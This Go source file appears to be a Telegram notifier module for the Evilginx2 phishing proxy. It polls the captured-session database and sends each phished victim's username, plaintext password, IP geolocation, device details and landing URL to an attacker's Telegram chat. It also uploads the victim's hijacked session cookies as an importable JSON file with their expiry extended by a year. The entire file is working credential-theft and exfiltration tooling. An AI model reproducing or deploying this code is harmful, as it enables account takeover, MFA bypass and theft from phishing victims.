package core

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

// TelegramNotifier handles sending notifications to Telegram by watching the database
type TelegramNotifier struct {
	botToken       string
	chatID         string
	client         *http.Client
	db             *database.Database
	cfg            *Config
	mu             sync.Mutex
	notifiedSessions map[int]bool // Track notified session IDs (database IDs)
	running        bool
	stopChan       chan struct{}
}

var (
	telegramInstance *TelegramNotifier
	telegramOnce     sync.Once
)

// IPGeoInfo holds geolocation data for an IP address
type IPGeoInfo struct {
	IP          string `json:"ip"`
	Country     string `json:"country"`
	CountryCode string `json:"countryCode"`
	Region      string `json:"regionName"`
	City        string `json:"city"`
	ISP         string `json:"isp"`
	Org         string `json:"org"`
	Timezone    string `json:"timezone"`
}

// GetIPGeoLocation fetches geolocation info for an IP address
func GetIPGeoLocation(ip string) (*IPGeoInfo, error) {
	apiURL := fmt.Sprintf("http://ip-api.com/json/%s?fields=status,country,countryCode,regionName,city,isp,org,timezone,query", ip)

	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var result struct {
		Status      string `json:"status"`
		Country     string `json:"country"`
		CountryCode string `json:"countryCode"`
		RegionName  string `json:"regionName"`
		City        string `json:"city"`
		ISP         string `json:"isp"`
		Org         string `json:"org"`
		Timezone    string `json:"timezone"`
		Query       string `json:"query"`
	}

	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
		return nil, err
	}

	if result.Status != "success" {
		return &IPGeoInfo{IP: ip, Country: "Unknown", City: "Unknown", ISP: "Unknown"}, nil
	}

	return &IPGeoInfo{
		IP:          result.Query,
		Country:     result.Country,
		CountryCode: result.CountryCode,
		Region:      result.RegionName,
		City:        result.City,
		ISP:         result.ISP,
		Org:         result.Org,
		Timezone:    result.Timezone,
	}, nil
}

// GetCountryFlag returns emoji flag for country code
func GetCountryFlag(countryCode string) string {
	if len(countryCode) != 2 {
		return "🌍"
	}
	countryCode = strings.ToUpper(countryCode)
	flag := string(rune(0x1F1E6+int(countryCode[0])-'A')) + string(rune(0x1F1E6+int(countryCode[1])-'A'))
	return flag
}

// GetDeviceInfo extracts device info from user agent
func GetDeviceInfo(userAgent string) string {
	ua := strings.ToLower(userAgent)
	
	var os, browser string
	
	// Detect OS
	switch {
	case strings.Contains(ua, "windows nt 10"):
		os = "Windows 10/11"
	case strings.Contains(ua, "windows nt 6.3"):
		os = "Windows 8.1"
	case strings.Contains(ua, "windows nt 6.1"):
		os = "Windows 7"
	case strings.Contains(ua, "mac os x"):
		os = "macOS"
	case strings.Contains(ua, "android"):
		os = "Android"
	case strings.Contains(ua, "iphone"):
		os = "iPhone"
	case strings.Contains(ua, "ipad"):
		os = "iPad"
	case strings.Contains(ua, "linux"):
		os = "Linux"
	default:
		os = "Unknown OS"
	}
	
	// Detect Browser
	switch {
	case strings.Contains(ua, "edg/"):
		browser = "Edge"
	case strings.Contains(ua, "chrome/") && !strings.Contains(ua, "edg/"):
		browser = "Chrome"
	case strings.Contains(ua, "firefox/"):
		browser = "Firefox"
	case strings.Contains(ua, "safari/") && !strings.Contains(ua, "chrome/"):
		browser = "Safari"
	default:
		browser = "Unknown Browser"
	}
	
	return fmt.Sprintf("%s / %s", os, browser)
}

// NewTelegramNotifier creates a new Telegram notifier
func NewTelegramNotifier(botToken, chatID string) *TelegramNotifier {
	return &TelegramNotifier{
		botToken:         botToken,
		chatID:           chatID,
		client:           &http.Client{Timeout: 30 * time.Second},
		notifiedSessions: make(map[int]bool),
		stopChan:         make(chan struct{}),
	}
}

// StartDatabaseWatcher starts watching the database for new completed sessions
func StartDatabaseWatcher(db *database.Database, cfg *Config) {
	telegramOnce.Do(func() {
		botToken := cfg.GetTelegramBotToken()
		chatID := cfg.GetTelegramUserID()
		
		if botToken == "" || chatID == "" {
			log.Debug("Telegram not configured, database watcher not started")
			return
		}
		
		telegramInstance = &TelegramNotifier{
			botToken:         botToken,
			chatID:           chatID,
			client:           &http.Client{Timeout: 30 * time.Second},
			db:               db,
			cfg:              cfg,
			notifiedSessions: make(map[int]bool),
			stopChan:         make(chan struct{}),
			running:          true,
		}
		
		go telegramInstance.watchDatabase()
		log.Info("Telegram database watcher started")
	})
}

// StopDatabaseWatcher stops the database watcher
func StopDatabaseWatcher() {
	if telegramInstance != nil && telegramInstance.running {
		close(telegramInstance.stopChan)
		telegramInstance.running = false
	}
}

// watchDatabase polls the database for completed sessions
func (t *TelegramNotifier) watchDatabase() {
	ticker := time.NewTicker(3 * time.Second) // Check every 3 seconds
	defer ticker.Stop()
	
	for {
		select {
		case <-t.stopChan:
			return
		case <-ticker.C:
			t.checkForCompletedSessions()
		}
	}
}

// checkForCompletedSessions checks the database for sessions with captured tokens
func (t *TelegramNotifier) checkForCompletedSessions() {
	// Refresh config in case tokens changed
	t.botToken = t.cfg.GetTelegramBotToken()
	t.chatID = t.cfg.GetTelegramUserID()
	
	if t.botToken == "" || t.chatID == "" {
		return
	}
	
	sessions, err := t.db.ListSessions()
	if err != nil {
		log.Debug("Telegram watcher: failed to list sessions: %v", err)
		return
	}
	
	for _, s := range sessions {
		// Skip if already notified
		t.mu.Lock()
		if t.notifiedSessions[s.Id] {
			t.mu.Unlock()
			continue
		}
		t.mu.Unlock()
		
		// Check if session has captured tokens (completed session)
		if len(s.CookieTokens) > 0 {
			// Session has cookies - it's complete
			err := t.sendSessionNotification(s)
			if err != nil {
				log.Error("Telegram notification failed for session %d: %v", s.Id, err)
			} else {
				t.mu.Lock()
				t.notifiedSessions[s.Id] = true
				t.mu.Unlock()
				log.Success("Telegram notification sent for session %d", s.Id)
			}
		}
	}
}

// sendSessionNotification sends the formatted notification for a session
func (t *TelegramNotifier) sendSessionNotification(s *database.Session) error {
	// Get geolocation info
	ip := s.RemoteAddr
	if idx := strings.LastIndex(ip, ":"); idx != -1 {
		ip = ip[:idx]
	}
	
	geoInfo, err := GetIPGeoLocation(ip)
	if err != nil {
		geoInfo = &IPGeoInfo{IP: ip, Country: "Unknown", City: "Unknown", ISP: "Unknown"}
	}
	
	// Build the message in the exact format requested
	var msg strings.Builder
	
	// Header
	msg.WriteString("🚨🚨 <b>SESSION CAPTURED!</b> 🚨🚨\n")
	msg.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n\n")
	
	// Credentials Section
	msg.WriteString("🔐 <b>CREDENTIALS</b>\n")
	msg.WriteString("┌─────────────────────\n")
	if s.Username != "" {
		msg.WriteString(fmt.Sprintf("│ 👤 <b>Username:</b> <code>%s</code>\n", escapeHTML(s.Username)))
	} else {
		msg.WriteString("│ 👤 <b>Username:</b> <i>not captured</i>\n")
	}
	if s.Password != "" {
		msg.WriteString(fmt.Sprintf("│ 🔑 <b>Password:</b> <tg-spoiler>%s</tg-spoiler>\n", escapeHTML(s.Password)))
	} else {
		msg.WriteString("│ 🔑 <b>Password:</b> <i>not captured</i>\n")
	}
	msg.WriteString("└─────────────────────\n\n")
	
	// Session Info
	msg.WriteString("📋 <b>SESSION INFO</b>\n")
	msg.WriteString("┌─────────────────────\n")
	msg.WriteString(fmt.Sprintf("│ 🎯 <b>Phishlet:</b> %s\n", escapeHTML(s.Phishlet)))
	msg.WriteString(fmt.Sprintf("│ 🆔 <b>Session ID:</b> %d\n", s.Id))
	msg.WriteString("└─────────────────────\n\n")
	
	// User Agent
	msg.WriteString("🖥 <b>USER AGENT</b>\n")
	msg.WriteString(fmt.Sprintf("<code>%s</code>\n\n", escapeHTML(s.UserAgent)))
	
	// Landing URL
	msg.WriteString("🔗 <b>LANDING URL</b>\n")
	msg.WriteString(fmt.Sprintf("<code>%s</code>\n\n", escapeHTML(s.LandingURL)))
	
	// Location Info
	flag := GetCountryFlag(geoInfo.CountryCode)
	location := geoInfo.City
	if geoInfo.Region != "" && geoInfo.Region != geoInfo.City {
		location += ", " + geoInfo.Region
	}
	
	msg.WriteString("📍 <b>LOCATION INFO</b>\n")
	msg.WriteString("┌─────────────────────\n")
	msg.WriteString(fmt.Sprintf("│ 📌 <b>Location:</b> %s\n", escapeHTML(location)))
	msg.WriteString(fmt.Sprintf("│ %s <b>Country:</b> %s %s\n", flag, escapeHTML(geoInfo.Country), flag))
	msg.WriteString(fmt.Sprintf("│ 🏢 <b>ISP:</b> %s\n", escapeHTML(geoInfo.ISP)))
	msg.WriteString(fmt.Sprintf("│ 🌐 <b>Remote IP:</b> %s\n", escapeHTML(geoInfo.IP)))
	msg.WriteString("└─────────────────────\n\n")
	
	// Timestamps
	createTime := time.Unix(s.CreateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")
	updateTime := time.Unix(s.UpdateTime, 0).UTC().Format("2006-01-02 15:04:05 UTC")
	
	msg.WriteString("⏰ <b>TIMESTAMPS</b>\n")
	msg.WriteString("┌─────────────────────\n")
	msg.WriteString(fmt.Sprintf("│ 📅 <b>Created:</b> %s\n", createTime))
	msg.WriteString(fmt.Sprintf("│ 🔄 <b>Updated:</b> %s\n", updateTime))
	msg.WriteString("└─────────────────────\n\n")
	
	// Cookie count and footer
	tokenCount := 0
	for _, tokens := range s.CookieTokens {
		tokenCount += len(tokens)
	}
	
	msg.WriteString("━━━━━━━━━━━━━━━━━━━━━━\n")
	msg.WriteString(fmt.Sprintf("🍪 <b>Cookies tokens captured:</b> captured (%d)\n", tokenCount))
	msg.WriteString("📎 <i>Cookie file attached below</i>")
	
	// Send the text message
	err = t.sendMessage(msg.String())
	if err != nil {
		return fmt.Errorf("failed to send message: %v", err)
	}
	
	// Send cookies file if we have any
	if tokenCount > 0 {
		err = t.sendCookiesFile(s)
		if err != nil {
			log.Error("Failed to send cookies file: %v", err)
		}
	}
	
	return nil
}

// sendCookiesFile sends the cookies as a .txt file
func (t *TelegramNotifier) sendCookiesFile(s *database.Session) error {
	// Build JSON cookie array in the exact format requested
	type CookieJSON struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
		Secure         bool   `json:"secure"`
		Session        bool   `json:"session"`
	}
	
	var cookies []CookieJSON
	expiration := time.Now().Add(365 * 24 * time.Hour).Unix()
	
	for domain, tokens := range s.CookieTokens {
		for name, token := range tokens {
			c := CookieJSON{
				Path:           token.Path,
				Domain:         domain,
				ExpirationDate: expiration,
				Value:          token.Value,
				Name:           name,
				HttpOnly:       token.HttpOnly,
				HostOnly:       !strings.HasPrefix(domain, "."),
				Secure:         strings.HasPrefix(name, "__Host-") || strings.HasPrefix(name, "__Secure-"),
				Session:        false,
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}
	
	jsonData, err := json.Marshal(cookies)
	if err != nil {
		return fmt.Errorf("failed to marshal cookies: %v", err)
	}
	
	// Create filename based on username (email) - keep @ symbol
	filename := s.Username
	if filename == "" {
		filename = fmt.Sprintf("session_%d", s.Id)
	}
	// Only sanitize dangerous characters, keep @
	filename = strings.ReplaceAll(filename, "/", "_")
	filename = strings.ReplaceAll(filename, "\\", "_")
	filename = strings.ReplaceAll(filename, ":", "_")
	filename = strings.ReplaceAll(filename, "*", "_")
	filename = strings.ReplaceAll(filename, "?", "_")
	filename = strings.ReplaceAll(filename, "\"", "_")
	filename = strings.ReplaceAll(filename, "<", "_")
	filename = strings.ReplaceAll(filename, ">", "_")
	filename = strings.ReplaceAll(filename, "|", "_")
	filename = filename + "_cookies.txt"
	
	// Send file with just the JSON content
	return t.sendDocument(filename, jsonData, "")
}

// sendMessage sends a text message to Telegram
func (t *TelegramNotifier) sendMessage(text string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", t.botToken)

	data := url.Values{}
	data.Set("chat_id", t.chatID)
	data.Set("text", text)
	data.Set("parse_mode", "HTML")
	data.Set("disable_web_page_preview", "true")

	resp, err := t.client.PostForm(apiURL, data)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		body, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s", string(body))
	}

	return nil
}

// sendDocument sends a document to Telegram
func (t *TelegramNotifier) sendDocument(filename string, data []byte, caption string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendDocument", t.botToken)

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	part, err := writer.CreateFormFile("document", filename)
	if err != nil {
		return err
	}
	_, err = part.Write(data)
	if err != nil {
		return err
	}

	writer.WriteField("chat_id", t.chatID)
	if caption != "" {
		writer.WriteField("caption", caption)
		writer.WriteField("parse_mode", "HTML")
	}

	writer.Close()

	req, err := http.NewRequest("POST", apiURL, body)
	if err != nil {
		return err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("telegram API error: %s", string(respBody))
	}

	return nil
}

// TestConnection tests if the Telegram bot is properly configured
func (t *TelegramNotifier) TestConnection() error {
	if t.botToken == "" || t.chatID == "" {
		return fmt.Errorf("telegram bot token or user ID not configured")
	}

	testMsg := "✅ <b>Evilginx Telegram Integration Test</b>\n\n" +
		"Your Telegram notifications are working correctly!\n" +
		fmt.Sprintf("⏰ Test time: %s", time.Now().Format("2006-01-02 15:04:05 MST"))

	return t.sendMessage(testMsg)
}

// Helper functions
func escapeHTML(s string) string {
	s = strings.ReplaceAll(s, "&", "&amp;")
	s = strings.ReplaceAll(s, "<", "&lt;")
	s = strings.ReplaceAll(s, ">", "&gt;")
	return s
}

func sanitizeFilenameForTelegram(s string) string {
	invalid := []string{"/", "\\", ":", "*", "?", "\"", "<", ">", "|", " ", "@"}
	result := s
	for _, char := range invalid {
		result = strings.ReplaceAll(result, char, "_")
	}
	result = strings.Trim(result, ". ")
	if result == "" {
		result = "unknown"
	}
	return result
}

// Legacy function for compatibility - no longer used but kept for compilation
func SendFullCredentialCapture(session *Session, cfg *Config, phishletHostname string) error {
	// This is now handled by the database watcher
	return nil
}
